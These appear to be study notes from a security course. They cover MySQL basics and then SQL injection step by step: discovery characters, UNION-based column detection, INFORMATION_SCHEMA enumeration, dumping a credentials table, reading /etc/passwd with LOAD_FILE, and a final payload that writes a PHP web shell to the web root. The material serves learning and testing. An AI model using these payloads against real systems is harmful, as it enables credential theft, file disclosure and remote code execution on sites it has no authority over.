# SQL Basics

        
- Creating a database
```
        mysql> CREATE DATABASE users;
```
        
- view the list of databases
```
        mysql> SHOW DATABASES;
```


- switch to a database
```
        mysql> USE {database};
```
!SQL statements aren't case sensitive
!The database name and columns are case sensitive,



- example
```
        CREATE TABLE logins (
            id INT,
            username VARCHAR(100), //strings of 100 characters each
            password VARCHAR(100),
            date_of_joining DATETIME
            );
```
        
        
        
- list of tables in the current database
```
        mysql> SHOW TABLES;
```

        
- list the table structure with its fields and data types
```
        mysql> DESCRIBE {database} ;
```

- Table Properties

 we can set the id column to auto-increment using the 
AUTO_INCREMENT keyword, which automatically increments the id by one every time a new item 
is added to the table:

```id INT NOT NULL AUTO_INCREMENT```

The NOT NULL constraint ensures that a particular column is never left empty.' We can also use the UNIQUE constraint to ensures that the inserted item are always unique.

```username VARCHAR(100) UNIQUE NOT NULL```

the DEFAULT keyword is used to specify the default value

```date_of_joining DATETIME DEFAULT NOW()```

PRIMARY KEY is used to uniquely identify each record in the table

```PRIMARY KEY (id)```

- example

```
        CREATE TABLE logins (
            id INT NOT NULL AUTO_INCREMENT,
            username VARCHAR(100) UNIQUE NOT NULL,
            password VARCHAR(100) NOT NULL,
            date_of_joining DATETIME DEFAULT NOW(),
            PRIMARY KEY (id)
            );
```


# SQL Statements


- INSERT Statement

 ```INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...); ```

- example

```mysql> INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02'); ```

we can skip filling columns with default values, such as id and date_of_joining. 

```INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...); ```

!Note: skipping columns with the 'NOT NULL' constraint will result in an error, as it is a required value.

We can also insert multiple records at once by separating them with a comma:
```
        mysql> INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
```





- SELECT Statement

retrieve data with the SELECT statement
```
        SELECT * FROM table_name;
```
```
        SELECT column1, column2 FROM table_name;
```

- DROP Statement


We can use DROP to remove tables and databases from the server.
```
        mysql> DROP TABLE logins;
```
The 'DROP' statement will permanently and completely delete the table with no confirmation, so it should be used with caution.

- ALTER Statement



adds a new column newColumn to the logins table using ADD

```
        mysql> ALTER TABLE logins ADD newColumn INT;
```

To rename a column, we can use RENAME COLUMN
```
        mysql> ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;
```

We can also change a column's datatype with MODIFY
```
        mysql> ALTER TABLE logins MODIFY oldColumn DATE;
```

we can drop a column using DROP:
```
        mysql> ALTER TABLE logins DROP oldColumn;
```



- UPDATE Statement

can be used to update specific record within a table, based on certain conditions
```
    mysql>    UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
```


```
        mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;
```

        Note: we have to specify the 'WHERE' clause with UPDATE, in order to specify 
        which records get updated. 




# Query Results

        
### Sorting Results

We can sort the results of any query using ORDER BY 
```
mysql> SELECT * FROM logins ORDER BY password;
```

By default, the sort is done in ascending order, but we can also sort the results by ASC or DESC
```
mysql> SELECT * FROM logins ORDER BY password DESC;
```
It is also possible to sort by multiple columns, to have a secondary sort for duplicate values in one column:
```
 mysql> SELECT * FROM logins ORDER BY password DESC, id ASC;
```



### LIMIT results

```
mysql> SELECT * FROM logins LIMIT 2;
```
If we wanted to LIMIT results with an offset, we could specify the offset before the LIMIT count:
```
mysql> SELECT * FROM logins LIMIT 1, 2;
```
!Note: the offset marks the order of the first record to be included, starting from 0. For the above, it starts and includes the 2nd record, and returns two values.

### WHERE Clause

we can use conditions with the SELECT statement using the WHERE clause, to fine-tune the results:

```
mysql> SELECT * FROM table_name WHERE <condition>;
```
!Note: String and date data types should be surrounded by single quote (') or double quotes ("), while numbers can be used directly.


### LIKE Clause

Another useful SQL clause is LIKE, enabling selecting records by matching a certain pattern. 

```
mysql> SELECT * FROM logins WHERE username LIKE 'admin%';
```
The % symbol acts as a wildcard and matches all characters after admin. It is used to match zero or more characters. Similarly, the _ symbol is used to match exactly one character. 
The below query matches all usernames with exactly three characters in them, which in this case was tom:
```
mysql> SELECT * FROM logins WHERE username like '___';
```

# SQL Operators


 - AND Operator

 ```condition1 AND condition2```


- OR Operator

```mysql> SELECT 1 = 1 OR 'test' = 'abc';```

- NOT Operator

```mysql> SELECT NOT 1 = 1;```


- Symbol Operators

The AND, OR and NOT operators can also be represented as &&, || and !, respectively. 


```
mysql> SELECT * FROM logins WHERE username != 'john';   ///username NOT john
```

```
mysql> SELECT * FROM logins WHERE username != 'john' AND id > 1; 
```        

# SQLi Discovery
we first have to test whether the  form is vulnerable to SQL injection


|Payload 	|URL Encoded|
|----------|-----------|
' 	        |    %27
" 	         |   %22
\# 	          |  %23
; 	          |  %3B
) 	           | %29



Note: In some cases, we may have to use the URL encoded version of the payload. 


### OR Injection

We would need the query always to return true, regardless of the username and password entered, to bypass the authentication. To do this, we can abuse the OR operator in our SQL injection.


Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. 
        
Tip:  a (#) symbol is usually considered as a tag inside a URL.  we can use '%23', which is an URL encoded (#) symbol.


### Union

The Union clause is used to combine results from multiple SELECT statements. This means 
that through a UNION injection, we will be able to SELECT and dump data from all across
the DBMS, from multiple tables and databases.

!Note: The data types of the selected columns on all positions should be the same.

!A UNION statement can only operate on SELECT statements with an equal number of columns. 
      



#### Un-even Columns

suppose we only had one column. In that case, we want to SELECT, we can put junk data for the remaining required columns so that the total number of columns we are UNIONing with remains the same as the original query.

! Note: When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. 

!Tip: For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.



### Detect number of columns


- Using ORDER BY
- Using UNION
        
#### Using  ORDER BY

we can start with order by 1, sort by the first column, and succeed, as the table must have at least one column. Then we will do order by 2 and then order by 3 until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist.

```' order by 1-- - ```



#### Using UNION


```' UNION select 1,2,3-- -  ```

always gives an error until we get a success


        
        
## Location of Injection

While a query may return multiple columns, the web application may only display some of them. So, if we inject our query in a column that is not printed on the page, we will not get its output. This is why we need to determine which columns are printed to the page, to determine where to place our injection





# Database Enumeration


### MySQL Fingerprinting

As an initial guess, if the webserver we see in HTTP responses is Apache or Nginx, 
it is a good guess that the webserver is running on Linux, so the DBMS is likely MySQL. 
The same also applies to Microsoft DBMS if the webserver is IIS, so it is likely to be MSSQL.

#### mysql

        
```
SELECT @@version  ///When we have full query output

        MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1'


 SELECT POW(1,1)  ///When we only have numeric output

        1


SELECT SLEEP(5)  ///Blind/No Output
```

        
### INFORMATION_SCHEMA Database


The INFORMATION_SCHEMA database contains metadata about the databases and tables present on the server. 

!To reference a table present in another DB, we can use the dot ‘.’ operator.

```SELECT * FROM my_database.users;```



#### SCHEMATA

The table SCHEMATA in the INFORMATION_SCHEMA database contains information about all databases on the server. 
```
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

We can find the current database with the SELECT database() query.

```' UNION select 1,database(),2,3-- - ```



#### TABLES

To find all tables within a database, we can use the TABLES table in the INFORMATION_SCHEMA Database.
we are interested in the TABLE_SCHEMA and TABLE_NAME columns. The TABLE_NAME column stores table names, while the TABLE_SCHEMA column points to the database each table belongs to.


```' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'--```

!Note: we added a (where table_schema='dev') condition to only return tables from the 'dev' database, otherwise we would get all tables in all databases, which can be many.




#### COLUMNS

The COLUMNS table contains information about all columns present in all the databases. 
The COLUMN_NAME, TABLE_NAME, and TABLE_SCHEMA columns can be used to achieve this.


```
' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- 
```

#### Data

```' UNION select 1, username, password, 4 from dev.credentials-- - ```


# Reading Files

        
### Privileges

the DB user must have the FILE privilege to load a file's content into a table and then dump data from that table and read files.


```
    SELECT USER()
    SELECT CURRENT_USER()
    SELECT user from mysql.user
```
#### User Privileges
```
SELECT super_priv FROM mysql.user  ///test if we have super admin privileges
```

! If we had many users within the DBMS, we can add WHERE user="username" to only show privileges for our current user


#### all of the possible privileges given to our current user  
```
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- 
```
IF we see that the FILE privilege is listed for our user, enabling us to read files and potentially even write files.




### LOAD_FILE

The LOAD_FILE() function can be used in MariaDB / MySQL to read data from files.
```
SELECT LOAD_FILE('/etc/passwd');
```

Note: We will only be able to read the file if the OS user running MySQL has enough privileges to read it.
```
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

### Writing Files

To be able to write files to the back-end server using a MySQL database, we require three things:

- User with FILE privilege 
- MySQL global secure_file_priv variable not enabled
- Write access to the location we want to write to on the back-end server


#### secure_file_priv

The secure_file_priv variable is used to determine where to read/write files from.
- An empty value lets us read files from the entire file system. 
- Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. 
- NULL means we cannot read/write from any directory. 

```SHOW VARIABLES LIKE 'secure_file_priv'; ```


MySQL global variables are stored in a table called global_variables, and this table has two columns variable_name and variable_value.

```SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"```



### SELECT INTO OUTFILE

The SELECT INTO OUTFILE statement can be used to write data from select queries into files.

```SELECT * from users INTO OUTFILE '/tmp/credentials';```

It is also possible to directly SELECT strings into files

```SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';```

!Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long files including binary data.



### Writing a Web Shell

```' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- ```
